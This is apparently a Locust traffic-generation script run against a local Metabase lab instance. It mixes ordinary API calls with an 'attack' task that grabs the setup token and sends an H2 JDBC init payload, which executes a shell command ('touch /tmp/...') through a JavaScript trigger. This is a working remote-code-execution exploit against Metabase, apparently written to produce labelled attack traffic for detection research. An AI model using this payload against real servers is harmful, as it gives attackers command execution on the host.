from locust import HttpUser, task, between, events
from locust.clients import ResponseContextManager
import random
import string  
from loguru import logger  
import os
from itertools import count
import json
import gevent
import io
import re
import time
from playwright.sync_api import sync_playwright
import bs4
from urllib.parse import unquote
from gevent.lock import Semaphore


test_mode = "db"
data_dir = "/var/www/html/uploads/"

counter = count(0)  # 计数器，用于生成唯一的消息 ID
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # 日志文件路径
answers = {}

users = [
    {
        "username": "vulhub@example.com",
        "password": "Test@123",
        "id": 1
    },
]
users_crt = []

@events.test_start.add_listener
def on_test_start(environment, **_kwargs):
    def get_headers(url, username, password):  
        with sync_playwright() as p:  
            browser = p.chromium.launch()
            logger.info("Browser launched")
            page = browser.new_page()  
            
            try:  
                # 访问登录页  
                page.goto(f"{url}")  
                
                # 填写并提交登录表单  
                page.fill('input[name="username"]', username)  
                page.fill('input[name="password"]', password)  
                page.click('button[type="submit"]') 
                
                logger.info("Login form submitted")
                # 等待页面加载完成  
                page.wait_for_load_state('networkidle')  
                logger.info("Page loaded")
                
                cookies = page.context.cookies()
                useragent = page.evaluate("navigator.userAgent")
                
                return cookies, useragent
            finally:  
                browser.close()
    
    # CRSF_TOKEN, COOKIES, USER_AGENT = get_pgadmin_headers("http://localhost:5050", "vulhub@example.com", "vulhub")
    for user in users:
        crt = {}
        crt["COOKIES"], crt["USER_AGENT"] = get_headers("http://localhost:3000/auth/login", user["username"], user["password"])
        users_crt.append(crt)
    input("Press Enter to Start the test...")  # 等待用户按下回车键


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """计算请求的字节数"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """生成随机字符串"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """创建新的日志条目""" 
    # print(str(response.request.body) if response.request.body else "")
    # print(response.request.headers)
    try:
        body = json.loads(str(response.request.body)) if response.request.body else {} 
        body = {k: str(v) for k, v in body.items()}  # 将所有值转换为字符串
    except json.JSONDecodeError:
        boundary_match = re.search(r'boundary=(.+?)', response.request.headers.get('Content-Type', ''))
        body = {}
        if boundary_match:
            boundary = boundary_match.group(1)
            # print("boundary:", boundary)
            parts = response.request.body.decode("utf-8").split('--' + boundary)
            for part in parts:
                if 'Content-Disposition' in part:
                    # 提取 name
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        # print("name:", name)
                        if name == 'm1_files[]':
                            # 提取 filename
                            filename_match = re.search(r'filename="([^"]+)"', part)
                            if filename_match:
                                body['filename'] = filename_match.group(1)
                        else:
                            # 提取对应的值
                            # print(repr(part.split(name)[1]))
                            value_match = re.search(r'\r\n\r\n(.*?)\r\n', part.split(name)[1], re.DOTALL)
                            if value_match:
                                value = value_match.group(1).strip()
                                body[name] = value

    if response.request.headers.get("Content-Type") == "application/x-www-form-urlencoded":
        # 如果是表单提交，解析表单数据
        body = {unquote(k): unquote(v) for k, v in (item.split('=') for item in str(response.request.body).split('&'))}

    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # 将所有值转换为字符串
    if '?' in response.request_meta["name"]:
        query_string = response.request_meta["name"].split('?')[1]
        query_params = query_string.split('&')
        for param in query_params:
            key, value = param.split('=')
            # 对key和value进行URL解码
            key = unquote(key)
            value = unquote(value)
            body[key] = value
    return {
        "verb": response.request_meta["request_type"],
        "uri": response.request_meta["name"],
        "bytes_sent": calculate_bytes_sent(
            response.request_meta["request_type"],
            response.request_meta["name"],
            response.request.headers,
            str(response.request.body) if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }


class APIUser(HttpUser):  
    """定义用户行为"""  
    wait_time = between(2, 4)  # 每次请求之间的等待时间（1到3秒之间随机）
    trans_id = None  # 初始化事务 ID
    user_index = 0  # 用户索引
        
    def on_start(self):
        try:
            # 登陆获取Session
            self.user_index = random.randint(0, len(users_crt) - 1)
            COOKIES = users_crt[self.user_index]["COOKIES"]
            USER_AGENT = users_crt[self.user_index]["USER_AGENT"]

            if all([COOKIES, USER_AGENT]):
                self.client.headers["Cookie"] = "; ".join([f"{cookie['name']}={cookie['value']}" for cookie in COOKIES])
                self.client.headers["User-Agent"] = USER_AGENT
            else:
                logger.error("Failed to obtain cookies, or user agent.")
                raise Exception("Failed to obtain cookies, or user agent.")
            self.client.headers["Host"] = "localhost:3000"
            self.client.headers["Origin"] = "http://localhost:3000"

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            raise
        except gevent.Timeout:
            logger.error("Timeout occurred")
            raise
        except Exception as e:
            gevent.sleep(1)
            self.on_start()
    
    @task
    def new_article(self, article_id=0):
        """创建新集合"""
        # 生成随机数据
        title = random_string(10)
        x_request_id = str(next(counter))
        with self.client.post(
            f"/api/collection",
            headers={
                "x_request_id": x_request_id,
            },
            json={
                "authority_level": None,
                "color": "#509EE3",
                "description": f"This is a {title} collection",
                "parent_id": None,
                "name": title,
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 200:
                # 解析响应
                response.success()
            else:
                logger.error(f"{'new' if article_id == 0 else 'update'} article failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")

    @task
    def update_site_name(self):
        """更新站点名称"""
        x_request_id = str(next(counter))
        # 生成随机数据
        title = random_string(10)
        with self.client.put(
            f"/api/setting/site-name",
            headers={
                "x_request_id": x_request_id,
            },
            json={
                "placeholder": "Metabase",
                "value": title,
                "is_env_setting": False,
                "env_name": "MB_SITE_NAME",
                "description": "用于Metabase的这个实例的名称。",
                "default": "Metabase",
                "originalValue": "test",
                "display_name": "站点名称",
                "type": "string"
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 204:
                response.success()
            else:
                logger.error(f"Update site name failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
    
    def get_session(self):
        x_request_id = str(next(counter))
        with self.client.get(
            "/api/session/properties",
            headers={
                "x_request_id": x_request_id,
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 200:
                response.success()
                return response.json()
            else:
                logger.error(f"Get session failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
                return None

    @task
    def attack(self):
        token = self.get_session()["setup-token"]
        file_name = random_string(10) + ".db"
        x_request_id = str(next(counter))
        with self.client.post(
            "/api/setup/validate",
            headers={
                "x_request_id": x_request_id,
            },
            json={
                "token": token,
                "details":
                {
                    "is_on_demand": False,
                    "is_full_sync": False,
                    "is_sample": False,
                    "cache_ttl": None,
                    "refingerprint": False,
                    "auto_run_queries": True,
                    "schedules": {},
                    "details":
                    {
                        "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
                        "advanced-options": False,
                        "ssl": True,
                        "init": rf"CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('touch /tmp/{file_name}')\u000A$$"
                    },
                    "name": "an-sec-research-team",
                    "engine": "h2"
                }
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 400:
                response.success()
                logger.info(f"Attack successful with token: {token}")
            else:
                logger.error(f"Attack failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # 将答案写入文件
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")
